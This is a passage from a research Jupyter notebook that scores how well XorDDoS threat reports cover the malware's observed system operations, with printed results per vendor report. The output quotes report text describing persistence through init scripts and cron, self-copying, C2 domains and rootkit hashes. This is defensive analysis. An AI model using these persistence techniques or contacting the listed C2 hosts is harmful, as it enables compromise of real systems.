    "        # R_malObj 比較物件\n",
    "        asg_object = set([op.object for op in sample.OPset])\n",
    "        ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        ctd_object = ctd_object.intersection(asg_object)\n",
    "        numerator = len(ctd_object) # 分子\n",
    "        denominator = len(asg_object) # 分母\n",
    "        R_malObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malObj is {R_malObj:.4f}\")\n",
    "        print(f\"\\t\\tctd_object: {ctd_object}\")\n",
    "\n",
    "        # R_malSysObj 比較系統物件\n",
    "        asg_sysobj = list(filter(lambda object: object.find('/etc') != -1, asg_object))\n",
    "        ctd_sysobj = list(filter(lambda object: object.find('/etc') != -1, ctd_object))\n",
    "        numerator = len(ctd_sysobj)\n",
    "        denominator = len(asg_sysobj)\n",
    "        R_malSysObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malSysObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malSysObj is {R_malSysObj:.4f}\")\n",
    "\n",
    "        # R_malOps 比較動作和物件\n",
    "        asg_OPset = list(sample.OPset)\n",
    "        ctd_OPset = list(rem.doc_OPset)\n",
    "        operationEvaluator = OperationEvaluator()\n",
    "        numerator, denominator, hits = 0, len(asg_OPset), []\n",
    "        hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        sys_hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        print(f\"\\t\\tlen(asg_OPset): {len(asg_OPset)}, len(ctd_OPset): {len(ctd_OPset)}\")\n",
    "        # 每一個 asg_op 跟所有同物件的的 ctd_op 進行 resolve() 比對，來判斷此 asg_op 是否被提及\n",
    "        i = 0\n",
    "        for idx_asg, asg_op in enumerate(asg_OPset): \n",
    "            i += 1\n",
    "            # print(f\"\\tno.{i} asg_op {asg_op}\") # 瓶頸卡在 no.51 step (total 71 step)\n",
    "            target_obj = asg_op.object\n",
    "            ctdSameObjOpsIdx = [i for i, x in enumerate(ctd_OPset) if x.object == target_obj]\n",
    "            # if i==51:\n",
    "            # print(f\"\\tno.{i} | asg_op {asg_op}, len of ctdSameObjOpsIdx: {ctdSameObjOpsIdx}\")\n",
    "            # ctdSameObjOps = [x for x in ctd_OPset if x.object == target_obj]\n",
    "            for idx in ctdSameObjOpsIdx:\n",
    "                pass\n",
    "                # mem_before_create_lst = get_mem_usage()\n",
    "                # print(\"\\tbefore resolve\", mem_before_create_lst)\n",
    "                hit = operationEvaluator.resolve(asg_op.action, ctd_OPset[idx].action)\n",
    "                # # print_mem_usage()\n",
    "                # mem_after_create_lst = get_mem_usage()\n",
    "                # # print(f\"\\t=== diff of mem_usage calling resolve(): {mem_after_create_lst - mem_before_create_lst:.2f}  ===\")\n",
    "        \n",
    "                if hit:\n",
    "                    numerator += 1\n",
    "                    (opModeAsg, opModeCtd) = hit # hit is [OperationMode]*2\n",
    "                    hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "                    fset.rem_lst[idx_rem].match_doc_OPset.add(ctd_OPset[idx])\n",
    "\n",
    "                    # 篩選出系統物件的動作\n",
    "                    if (opModeAsg in [OperationMode.FILE_UPDATE]) and asg_OPset[idx_asg].object.find('/etc') != -1:\n",
    "                        sys_hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "\n",
    "                    # 紀錄CTD的生命週期 (ASG_OP提及順序)\n",
    "                    step_num = sample.OPset_ordered.index(asg_op) # index of step, throw ValueError if not found\n",
    "                    fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "                    break\n",
    "        R_malOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malOps is {R_malOps:.4f}\")\n",
    "        print(f\"\\t\\trefered lifecycle: {fset.rem_lst[idx_rem].OPset_order_index}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        # fset.rem_lst[idx_rem].OPset_order_index.clear()\n",
    "        # for ctd_op in fset.rem_lst[idx_rem].match_doc_OPset:\n",
    "        #     step_num = sample.OPset_ordered.index(ctd_op) # index of step, throw ValueError if not found\n",
    "        #     fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "\n",
    "        # R_malChangeOps 篩選出系統物件的動作\n",
    "        # cando: 加上 OPMode的考量，為class OP加兩個mode asg_op_mode, ctd_op_mode。目前直接用call nlp class 的 method判別。\n",
    "        numerator = len(sys_hits)\n",
    "        sys_asg_OPset = [op for op in asg_OPset if op.object.find('/etc') != -1 \\\n",
    "                         and operationEvaluator.get_mode(op.action) == OperationMode.FILE_UPDATE ]\n",
    "        # print('sys_asg_OPset is unique:', len(sample.OPset_ordered) == len(set(sample.OPset_ordered))) # 元速度重複沒錯，可能是 index() 的問題\n",
    "        print(f\"\\t\\tsys_asg_OPset: {sys_asg_OPset}\")\n",
    "        denominator = len(sys_asg_OPset)\n",
    "        R_malChangeOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malChangeOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malChangeOps is {R_malChangeOps:.4f}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        fset.rem_lst[idx_rem].SysOPset_order_index.clear()\n",
    "        for asg_op , ctd_op in sys_hits:\n",
    "            step_num = sample.OPset_ordered.index(asg_op) # step index , throw ValueError if not found\n",
    "            fset.rem_lst[idx_rem].SysOPset_order_index.append(step_num)\n",
    "        print(f\"\\t\\tref-sys lifecycle: {fset.rem_lst[idx_rem].SysOPset_order_index}\")\n",
    "\n",
    "        if hits:\n",
    "            print(\"\\n\\thits\")\n",
    "            for asg_op, ctd_op in hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "        if sys_hits:\n",
    "            print(\"\\n\\tsys_hits\")\n",
    "            for asg_op, ctd_op in sys_hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "\n",
    "        # print_mem_usage()\n",
    "        # del asg_OPset, ctd_OPset, hits, sys_hits\n",
    "    print(\"\\n\\nOperationPair that changes system resources:\\n\", sys_asg_OPset)\n",
    "\n",
    "    return fset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def save_match_sent_to_excel(fset: FamilySet, sample_name=None):\n",
    "    columns = ['report','regex','matched word','sentence number','sentence']\n",
    "    if sample_name:\n",
    "        output_xlsx = f'{outputfolder}/{family}_{sample_name[:3]}_report_match_sent.csv'\n",
    "    else:\n",
    "        output_xlsx = f'{outputfolder}/{family}_union_report_match_sent.csv'\n",
    "    has_match = sum([len(rem.get_match_regexs()) for rem in fset.rem_lst])\n",
    "    if has_match == 0:\n",
    "        print('no matches in CTI reports') # with open 一定要寫入，若全空則直接不開檔\n",
    "        return\n",
    "    # with pd.ExcelWriter(output_xlsx, engine='openpyxl') as writer:\n",
    "    \n",
    "    # 遍歷報告，一個 rem: ReportEvalModel 代表一篇報告\n",
    "    csv_data = []\n",
    "    match_sentence_ttlcnt = 0\n",
    "    for rem in fset.rem_lst:\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        if len(rem.get_match_regexs()) == 0: # 如果報告中無 regex 跳過不紀錄\n",
    "            continue\n",
    "        # sheet_data = [] # shape = columns_len * match_sent_len\n",
    "        sent_df = rem.get_match_sentences()\n",
    "        sent_content_lst = rem.sentences['Content'] # 報告中的每個句子\n",
    "        match_sentence_ttlcnt += sent_df['match'].sum()\n",
    "\n",
    "        # 遍歷每個含有 regex 的句子\n",
    "        for sid, row in sent_df.iterrows():\n",
    "            if row['match'] == 0:\n",
    "                continue\n",
    "            row.drop('match', inplace=True)\n",
    "            row = row[row > 0]\n",
    "            # print(row)\n",
    "            # 考量每個句子可能含有多個 regex，故需寫成多行\n",
    "            for i, v in row.items():\n",
    "                insert_data = dict().fromkeys(columns)\n",
    "                insert_data['report'] = reportname\n",
    "                insert_data['regex'] = i\n",
    "                insert_data['matched word'] = rem.get_match_word(sid, i)\n",
    "                insert_data['sentence number'] = sid + 1\n",
    "                insert_data['sentence'] = str(sent_content_lst[sid]).strip()\n",
    "                # sheet_data.append(insert_data)\n",
    "                csv_data.append(insert_data)\n",
    "    df = pd.DataFrame(csv_data)\n",
    "    # print(df)\n",
    "    df.to_csv(output_xlsx, index=False)\n",
    "\n",
    "            # 輸出 csv\n",
    "            \n",
    "            # 輸出 excel sheet\n",
    "            # print(rem.reportname,'has', len(sheet_data),'matches')\n",
    "            # output_sheet = pd.DataFrame(sheet_data)\n",
    "            # # output_sheet.style.set_properties(subset=['sentence'])\n",
    "            # styler = Styler(horizontal_alignment='left', vertical_alignment='top')\n",
    "            # sf = StyleFrame(output_sheet, styler)\n",
    "            # sf = sf.set_column_width(columns=['baseline'], width=20.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence number'], width=15.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence'], width=80.0)\n",
    "            # sf.to_excel(writer, sheet_name=rem.reportname, index=False) #.save()\n",
    "            # # output_sheet.to_excel(writer, sheet_name=rem.reportname, index=False)\n",
    "    return match_sentence_ttlcnt\n",
    "\n",
    "# 此行會執行並複寫 excel，執行完後要手動調整行距格式，小心使用\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== mem_usage: 213.05 MB ===\n",
      "asg_object: {'/etc/rc', '/etc/sed', '/perl/', '/selinux', '^chkconfig$', 'bin/sed', 'permission(\\\\s|:)[0-9]{1,4}', 'update-rc.d', 'bin/openrc', '/etc/cron', '/var/run/', '[a-zA-z]:\\\\d{1,5}$', '^pipe(\\\\$|\\\\.|$)', '^systemctl$', '^sh$', 'bin/insserv', '/proc/', '/proc/rs_dev', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}:\\\\d{1,5}$', '/var/', '/run/', '/boot/[a-z]{10}', '^sed$', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/init.d/', '/boot/'}\n",
      "\n",
      "\n",
      "Sample Xorddos-Cdnetworks.csv\n",
      "\tnum of segment in report: 32\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Crowdstrike.csv\n",
      "\tnum of segment in report: 45\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Intezer.csv\n",
      "\tnum of segment in report: 156\n",
      "\tlenght of ctd's OPset is 7\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538\n",
      "\t\tctd_object: {'/etc/rc', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/proc/', '/etc/init.d/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 7\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 3, num of asg op: 73. R_malOps is 0.0411\n",
      "\t\trefered lifecycle: [68, 67, 0]\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\n",
      "Sample Xorddos-Ms.csv\n",
      "\tnum of segment in report: 252\n",
      "\tlenght of ctd's OPset is 51\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615\n",
      "\t\tctd_object: {'^sh$', '/var/run/', '/etc/rc', '/etc/cron', '/proc/rs_dev', '/proc/', '[a-zA-z]:\\\\d{1,5}$', '^chkconfig$', '/etc/init.d/', '/var/', '/run/', 'update-rc.d'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 51\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 18, num of asg op: 73. R_malOps is 0.2466\n",
      "\t\trefered lifecycle: [12, 55, 40, 15, 68, 2, 56, 50, 67, 51, 57, 0, 48, 69, 32, 52, 26, 49]\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP41 act=umask, obj=[a-zA-z]:\\d{1,5}$>, <OP38 act=fetch, obj=www.enoan2107.com:3306, sent=after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server: www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 malicious activity threads after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path\tfile type\tsha-256 /etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP14 act=check, obj=/proc/$pid, sent=a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP43 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP51 act=open, obj=/run/>, <OP31 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP14 act=check, obj=/proc/$pid, sent=a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.>\n",
      "\t<OP52 act=open, obj=/var/run/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP43 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP14 act=check, obj=/proc/$pid, sent=a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP53 act=open, obj=/var/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP27 act=clone, obj=^chkconfig$>, <OP33 act=perform, obj=chkconfig, sent=additionally, it performs the following tasks on a provided $pid:  fetches the process file name corresponding to the provided $pid deletes the file for the provided $pid deletes the installed init services: deletes /etc/init.d/<file_name> for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name> performs the command chkconfig –del <file_name> performs the command update-rc.d <file_name> remove ends the process that was provided as an argument.>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\n",
      "Sample Xorddos-Trendmicro.csv\n",
      "\tnum of segment in report: 27\n",
      "\tlenght of ctd's OPset is 6\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308\n",
      "\t\tctd_object: {'/var/run/', '/etc/rc', '/etc/cron', '[a-zA-z]:\\\\d{1,5}$', '/var/', '/run/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 6\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 9, num of asg op: 73. R_malOps is 0.1233\n",
      "\t\trefered lifecycle: [55, 15, 2, 56, 57, 48, 69, 32, 49]\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>\n",
